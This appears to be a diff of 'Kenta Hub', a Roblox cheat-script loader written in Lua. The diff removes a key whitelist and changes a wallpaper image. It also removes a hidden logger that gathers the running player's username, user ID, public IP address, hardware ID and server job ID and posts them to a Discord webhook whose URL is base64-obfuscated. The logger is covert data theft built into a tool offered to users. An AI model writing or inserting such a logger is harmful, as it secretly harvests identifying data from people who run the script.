@@ -1,27 +1,3 @@
-repeat
-    wait()
-until game:IsLoaded() and game.Players.LocalPlayer
-
--- Danh sách các key hợp lệ
-local keys = {
-    ["KentaHub_10dj29319rj"] = true,
-    ["KentaHub_10eu39dir2i"] = true,
-    ["KentaHub_1pf8fj3jf92"] = true,
-    ["KentaHub_10d9fjej3if"] = true
-}
-
--- Kiểm tra xem Key có tồn taij và đúng không
-if getgenv().Key and keys[getgenv().Key] then
-    print("Whitelist success!")
-  -- Dán script của bây vào đây
-else
-    if not getgenv().Key then
-        -- Nếu không có key, kêu nó nhập zô
-        warn("please enter your key!")
-    end
-    -- Nếu key không đúng, kick mịa nó luôn
-    game.Players.LocalPlayer:Kick("Invalid Key! Please enter your correct key!")
-end
 local ScreenGui = Instance.new("ScreenGui")
 local buoi = Instance.new('UICorner')
 local KeyUI = Instance.new("Frame")
@@ -149,7 +125,7 @@ Wallpaper.ScaleType = Enum.ScaleType.Fit
 Wallpaper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Wallpaper.Position = UDim2.new(-0.0361702, 0, -0.158876, 0)
 Wallpaper.Name = "Wallpaper"
-Wallpaper.Image = "rbxassetid://90811268786029"
+Wallpaper.Image = "rbxassetid://125075121424916"
 Wallpaper.Size = UDim2.new(1.11064, 0, 1.59989, 0)
 Wallpaper.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Wallpaper.Parent = INTRO
@@ -276,73 +252,6 @@ game:GetService("TweenService"):Create(Content, TweenInfo.new(5, Enum.EasingStyl
 wait(5.1)
 INTRO.Visible = false
 INTRO.GroupTransparency = 0
-function PostWebhook(Url, message)
-    local request = http_request or request or HttpPost or syn.request
-    local data =
-        request(
-        {
-            Url = Url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(message)
-        }
-    )
-    return ""
-end
-
-function AdminLoggerMsg()
-    AdminMessage = {
-        ["embeds"] = {
-            {
-                ["title"] = "**Script Kenta Hub**",
-                ["description"] ="",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xf93dff),
-                ["fields"] = {
-                    {
-                        ["name"] = "**Username**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**UserID**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**PlaceID**",
-                        ["value"] = "```" .. game.PlaceId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Hwid**",
-                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**JobID**",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Join Code**",
-                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
-                        ["inline"] = false
-                    }
-                },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }
-        }
-    }
-    return AdminMessage
-end
-
-PostWebhook("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxMzQ1NDUxMTIzMzU2ODgzOC84STJRS3g3VlpRS2NFNWctUlJmQTZnQk83Rlc5Wmx2N1RVT0dGUmpxZkdNeTUteWRPWjg2ZTNGdV9ZeFlyS21PWkhzcA==", AdminLoggerMsg()) -- Post to admin webhook
 
 local KentaA1 = {};
 
